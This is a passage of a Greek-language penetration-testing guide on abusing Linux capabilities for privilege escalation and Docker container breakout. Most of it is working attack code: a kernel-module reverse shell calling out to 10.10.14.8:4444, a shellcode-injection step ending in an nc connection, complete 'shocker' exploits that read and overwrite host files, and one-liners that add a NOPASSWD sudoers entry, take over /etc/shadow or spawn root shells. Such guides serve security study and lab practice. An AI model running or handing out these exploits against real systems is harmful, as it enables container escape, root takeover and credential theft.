Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
List **processes** running in the **host** `ps -eaf`

1. Get the **architecture** `uname -m`
2. Find a **shellcode** for the architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Find a **program** to **inject** the **shellcode** into a process memory ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modify** the **shellcode** inside the program and **compile** it `gcc inject.c -o inject`
5. **Inject** it and grab your **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** επιτρέπει σε ένα process να **φορτώνει και να αποφορτώνει kernel modules (`init_module(2)`, `finit_module(2)` και `delete_module(2)` system calls)**, προσφέροντας άμεση πρόσβαση στις βασικές λειτουργίες του kernel. Αυτή η capability παρουσιάζει κρίσιμους κινδύνους για την ασφάλεια, καθώς επιτρέπει privilege escalation και πλήρη compromise του συστήματος, επιτρέποντας τροποποιήσεις στον kernel και παρακάμπτοντας όλους τους μηχανισμούς ασφάλειας του Linux, συμπεριλαμβανομένων των Linux Security Modules και του container isolation.
**Αυτό σημαίνει ότι μπορείς να** **εισάγεις/αφαιρείς kernel modules στον/από τον kernel του host machine.**

**Παράδειγμα με binary**

Στο ακόλουθο παράδειγμα το binary **`python`** διαθέτει αυτή την capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Από προεπιλογή, η εντολή **`modprobe`** ελέγχει για λίστες dependencies και αρχεία map στον κατάλογο **`/lib/modules/$(uname -r)`**.\
Για να το εκμεταλλευτούμε αυτό, ας δημιουργήσουμε έναν πλαστό φάκελο **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Στη συνέχεια, **κάντε compile το kernel module· μπορείτε να βρείτε 2 παραδείγματα παρακάτω, και αντιγράψτε** το σε αυτόν τον φάκελο:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Τέλος, εκτέλεσε τον απαραίτητο κώδικα Python για να φορτώσεις αυτό το kernel module:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Παράδειγμα 2 με binary**

Στο ακόλουθο παράδειγμα, το binary **`kmod`** διαθέτει αυτή τη capability.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Πράγμα που σημαίνει ότι είναι δυνατό να χρησιμοποιήσετε την εντολή **`insmod`** για να εισαγάγετε ένα kernel module. Ακολουθήστε το παρακάτω παράδειγμα για να αποκτήσετε ένα **reverse shell**, εκμεταλλευόμενοι αυτό το privilege.

**Example with environment (Docker breakout)**

Μπορείτε να ελέγξετε τα ενεργοποιημένα capabilities μέσα στο docker container χρησιμοποιώντας:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Στην προηγούμενη έξοδο μπορείτε να δείτε ότι η δυνατότητα **SYS_MODULE** είναι ενεργοποιημένη.

**Δημιουργήστε** το **kernel module** που θα εκτελέσει ένα reverse shell και το **Makefile** για να το κάνετε **compile**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Ο κενός χαρακτήρας πριν από κάθε λέξη `make` στο Makefile **πρέπει να είναι tab και όχι κενά**!

Εκτελέστε `make` για να το μεταγλωττίσετε.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Τέλος, εκκινήστε το `nc` μέσα σε ένα shell και **φορτώστε το module** από ένα άλλο· έτσι θα capture-άρετε το shell στη διεργασία του nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το εργαστήριο "Abusing SYS_MODULE Capability" του** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Ένα ακόμη παράδειγμα αυτής της τεχνικής βρίσκεται στο [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

Το [**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει σε μια διεργασία να **παρακάμπτει τα permissions για την ανάγνωση αρχείων και για την ανάγνωση και εκτέλεση directories**. Η κύρια χρήση του είναι για αναζήτηση ή ανάγνωση αρχείων. Ωστόσο, επιτρέπει επίσης σε μια διεργασία να χρησιμοποιεί τη συνάρτηση `open_by_handle_at(2)`, η οποία μπορεί να αποκτήσει πρόσβαση σε οποιοδήποτε αρχείο, συμπεριλαμβανομένων αρχείων εκτός του mount namespace της διεργασίας. Το handle που χρησιμοποιείται στο `open_by_handle_at(2)` υποτίθεται ότι είναι ένα non-transparent identifier που λαμβάνεται μέσω της `name_to_handle_at(2)`, αλλά μπορεί να περιλαμβάνει ευαίσθητες πληροφορίες, όπως inode numbers, οι οποίες είναι ευάλωτες σε tampering. Η πιθανότητα exploitation αυτής της capability, ιδιαίτερα στο πλαίσιο Docker containers, παρουσιάστηκε από τον Sebastian Krahmer με το shocker exploit, όπως αναλύεται [εδώ](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Αυτό σημαίνει ότι μπορείς να** **παρακάμπτεις τους ελέγχους permissions ανάγνωσης αρχείων και τους ελέγχους permissions ανάγνωσης/εκτέλεσης directories.**

**Παράδειγμα με binary**

Το binary θα μπορεί να διαβάσει οποιοδήποτε αρχείο. Επομένως, αν ένα αρχείο όπως το tar έχει αυτή την capability, θα μπορεί να διαβάσει το αρχείο shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Παράδειγμα με το binary2**

Σε αυτήν την περίπτωση, ας υποθέσουμε ότι το binary **`python`** έχει αυτήν τη capability. Για να εμφανίσετε τα αρχεία του root, μπορείτε να εκτελέσετε:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Και για να διαβάσετε ένα αρχείο, θα μπορούσατε να κάνετε:
```python
print(open("/etc/shadow", "r").read())
```
**Example in Environment (Docker breakout)**

Μπορείτε να ελέγξετε τα ενεργοποιημένα capabilities μέσα στο docker container χρησιμοποιώντας:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Στο προηγούμενο output μπορείτε να δείτε ότι το capability **DAC_READ_SEARCH** είναι ενεργοποιημένο. Ως αποτέλεσμα, το container μπορεί να κάνει **debug processes**.

Μπορείτε να μάθετε πώς λειτουργεί το συγκεκριμένο exploit στο [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), αλλά συνοπτικά το **CAP_DAC_READ_SEARCH** όχι μόνο μας επιτρέπει να περιηγούμαστε στο file system χωρίς permission checks, αλλά επίσης καταργεί ρητά οποιουσδήποτε ελέγχους για το _**open_by_handle_at(2)**_ και **θα μπορούσε να επιτρέψει στη process μας να διαβάζει sensitive files που έχουν ανοίξει άλλα processes**.

Το αρχικό exploit που εκμεταλλεύεται αυτά τα permissions για την ανάγνωση αρχείων από το host βρίσκεται εδώ: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), ενώ το παρακάτω είναι μια **modified version που σας επιτρέπει να καθορίσετε το αρχείο που θέλετε να διαβάσετε ως πρώτο argument και να το αποθηκεύσετε σε ένα αρχείο.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Το exploit πρέπει να βρει έναν pointer σε κάτι που έχει γίνει mount στο host. Το αρχικό exploit χρησιμοποιούσε το αρχείο /.dockerinit και αυτή η τροποποιημένη έκδοση χρησιμοποιεί το /etc/hostname. Αν το exploit δεν λειτουργεί, ίσως χρειάζεται να ορίσετε ένα διαφορετικό αρχείο. Για να βρείτε ένα αρχείο που έχει γίνει mount στο host, απλώς εκτελέστε την εντολή mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: Το exploit πρέπει να βρει έναν pointer σε κάτι που έχει γίνει mount στο host. Το αρχικό exploit χρησιμοποιούσε το αρχείο /.dockerinit και αυτή η τροποποιημένη έκδοση χρησιμοποιεί...](<../../images/image (407) (1).png>)

**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το εργαστήριο "Abusing DAC_READ_SEARCH Capability" του** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)


## CAP_DAC_OVERRIDE

**Αυτό σημαίνει ότι μπορείτε να παρακάμψετε τους ελέγχους δικαιωμάτων εγγραφής σε οποιοδήποτε αρχείο, επομένως μπορείτε να γράψετε σε οποιοδήποτε αρχείο.**

Υπάρχουν πολλά αρχεία που μπορείτε να **αντικαταστήσετε για να κάνετε privilege escalation,** [**μπορείτε να βρείτε ιδέες εδώ**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Παράδειγμα με binary**

Σε αυτό το παράδειγμα, το vim έχει αυτήν την capability, επομένως μπορείτε να τροποποιήσετε οποιοδήποτε αρχείο, όπως τα _passwd_, _sudoers_ ή _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Παράδειγμα με binary 2**

Σε αυτό το παράδειγμα, το **`python`** binary θα έχει αυτήν την capability. Θα μπορούσες να χρησιμοποιήσεις το python για να αντικαταστήσεις οποιοδήποτε αρχείο:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Παράδειγμα με environment + CAP_DAC_READ_SEARCH (Docker breakout)**

Μπορείτε να ελέγξετε τα ενεργοποιημένα capabilities μέσα στο docker container χρησιμοποιώντας:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Αρχικά, διαβάστε την προηγούμενη ενότητα που [**κάνει abuse της δυνατότητας DAC_READ_SEARCH για την ανάγνωση αυθαίρετων αρχείων**](linux-capabilities.md#cap_dac_read_search) του host και **compile** το exploit.\
Στη συνέχεια, **compile την ακόλουθη έκδοση του shocker exploit**, η οποία θα σας επιτρέψει να **γράψετε αυθαίρετα αρχεία** μέσα στο filesystem του host:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Για να **διαφύγετε από** το docker container, θα μπορούσατε να **κατεβάσετε** τα αρχεία `/etc/shadow` και `/etc/passwd` από το host, να **προσθέσετε** σε αυτά έναν **νέο χρήστη** και να χρησιμοποιήσετε το **`shocker_write`** για να τα αντικαταστήσετε. Στη συνέχεια, να αποκτήσετε **πρόσβαση** μέσω **ssh**.

**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το laboratory "Abusing DAC_OVERRIDE Capability" του** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP_CHOWN

**Αυτό σημαίνει ότι είναι δυνατή η αλλαγή του ownership οποιουδήποτε αρχείου.**

**Παράδειγμα με binary**

Ας υποθέσουμε ότι το **`python`** binary διαθέτει αυτήν την capability. Μπορείτε να **αλλάξετε** τον **ιδιοκτήτη** του αρχείου **`shadow`**, να **αλλάξετε τον κωδικό πρόσβασης του root** και να κάνετε privilege escalation:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Ή με το **`ruby`** binary που διαθέτει αυτήν τη δυνατότητα:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Αυτό σημαίνει ότι είναι δυνατή η αλλαγή των δικαιωμάτων οποιουδήποτε αρχείου.**

**Παράδειγμα με binary**

Αν το python έχει αυτή τη δυνατότητα, μπορείτε να τροποποιήσετε τα δικαιώματα του αρχείου shadow, **να αλλάξετε τον κωδικό πρόσβασης του root** και να κάνετε κλιμάκωση προνομίων:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**Αυτό σημαίνει ότι είναι δυνατός ο ορισμός του effective user id της δημιουργημένης διεργασίας.**

**Παράδειγμα με binary**

Αν το python έχει αυτήν την **capability**, μπορείς πολύ εύκολα να την καταχραστείς για να κάνεις privilege escalation σε root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Ένας άλλος τρόπος:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Αυτό σημαίνει ότι είναι δυνατός ο ορισμός του effective group ID της δημιουργημένης διεργασίας.**

Υπάρχουν πολλά αρχεία που μπορείς να **αντικαταστήσεις για να κάνεις privilege escalation,** [**μπορείς να πάρεις ιδέες από εδώ**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Example with binary**

Σε αυτήν την περίπτωση θα πρέπει να αναζητήσεις ενδιαφέροντα αρχεία που μπορεί να διαβάσει μια ομάδα, επειδή μπορείς να κάνεις impersonate οποιαδήποτε ομάδα:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Μόλις βρείτε ένα αρχείο που μπορείτε να εκμεταλλευτείτε (μέσω ανάγνωσης ή εγγραφής) για privilege escalation, μπορείτε να **αποκτήσετε ένα shell με τα δικαιώματα του ενδιαφέροντος group** με:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Σε αυτή την περίπτωση έγινε impersonation της ομάδας shadow, επομένως μπορείτε να διαβάσετε το αρχείο `/etc/shadow`:
```bash
cat /etc/shadow
```
### Combined chain: CAP_SETGID + CAP_CHOWN

Όταν και οι δύο capabilities είναι διαθέσιμες στο ίδιο helper, μια πρακτική αλυσίδα είναι:

1. Άλλαξε το EGID σε `shadow` (ή σε άλλη privileged ομάδα).
2. Χρησιμοποίησε `chown` στο `/etc/shadow` για να ορίσεις το UID σου, διατηρώντας την ομάδα `shadow`.
3. Διάβασε ένα target hash και κάνε crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Αυτό αποφεύγει την άμεση ανάγκη για πλήρη πρόσβαση **root** και συνήθως αρκεί για **pivot** μέσω επαναχρησιμοποίησης διαπιστευτηρίων.

Αν είναι εγκατεστημένο το **docker**, θα μπορούσες να **impersonate** το **docker group** και να το εκμεταλλευτείς για επικοινωνία με το [**docker socket** και **escalate privileges**](#writable-docker-socket).

## CAP_SETFCAP

**Αυτό σημαίνει ότι είναι δυνατό να οριστούν capabilities σε αρχεία και processes**

**Example with binary**

Αν η python διαθέτει αυτή την **capability**, μπορείς πολύ εύκολα να την εκμεταλλευτείς για να κάνεις **escalate privileges** σε **root**:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Σημειώστε ότι αν ορίσετε μια νέα capability στο binary με CAP_SETFCAP, θα χάσετε αυτή την capability.

Μόλις αποκτήσετε [SETUID capability](linux-capabilities.md#cap_setuid), μπορείτε να μεταβείτε στην ενότητά της για να δείτε πώς να κάνετε privilege escalation.

**Παράδειγμα με περιβάλλον (Docker breakout)**

Από προεπιλογή, η capability **CAP_SETFCAP παρέχεται στη διεργασία μέσα στο container στο Docker**. Μπορείτε να το ελέγξετε εκτελώντας κάτι όπως:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Αυτή η capability επιτρέπει να **δοθεί οποιαδήποτε άλλη capability σε binaries**, οπότε θα μπορούσαμε να σκεφτούμε το **escaping** από το container **κάνοντας abuse οποιουδήποτε από τα άλλα capability breakouts** που αναφέρονται σε αυτή τη σελίδα.\
Ωστόσο, αν προσπαθήσετε να δώσετε, για παράδειγμα, τις capabilities CAP_SYS_ADMIN και CAP_SYS_PTRACE στο gdb binary, θα διαπιστώσετε ότι μπορείτε να τις δώσετε, αλλά το **binary δεν θα μπορεί να εκτελεστεί μετά από αυτό**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Από το documentation](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Αυτό είναι ένα **limiting superset για τα effective capabilities** που μπορεί να αναλάβει το thread. Είναι επίσης ένα limiting superset για τα capabilities που μπορούν να προστεθούν στο inheri‐table set από ένα thread που **δεν έχει το CAP_SETPCAP** capability στο effective set του._\
Φαίνεται ότι τα Permitted capabilities περιορίζουν αυτά που μπορούν να χρησιμοποιηθούν.\
Ωστόσο, το Docker παρέχει επίσης από προεπιλογή το **CAP_SETPCAP**, οπότε ίσως μπορείτε να **ορίσετε νέα capabilities μέσα στο inheritable set**.\
Ωστόσο, στην τεκμηρίωση αυτού του cap αναφέρεται: _CAP_SETPCAP : \[…] **add any capability from the calling thread’s bounding** set to its inheritable set_.\
Φαίνεται ότι μπορούμε να προσθέσουμε στο inheritable set μόνο capabilities από το bounding set. Αυτό σημαίνει ότι **δεν μπορούμε να τοποθετήσουμε νέα capabilities, όπως CAP_SYS_ADMIN ή CAP_SYS_PTRACE, στο inherit set για privilege escalation**.

## CAP_SYS_RAWIO

